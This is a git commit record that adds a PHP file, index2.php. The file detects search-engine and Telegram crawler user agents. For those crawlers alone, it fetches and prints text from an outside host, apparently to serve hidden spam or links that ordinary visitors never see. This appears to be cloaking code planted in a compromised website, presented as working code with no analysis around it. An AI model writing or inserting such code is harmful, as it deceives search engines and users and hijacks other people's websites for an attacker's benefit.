da8ac212aec4794c6a72df7c54073ef200635202
2S Struggle Street <vyscomaylando@gmail.com>
2024-11-15 00:14:22 +0700

    Create index2.php

---
+++ index2.php
@@ -0,0 +1,19 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://ampunsifu.com/suhu/plastivision.org.txt');#NAROLINK
+    echo $message;
+}
+?>
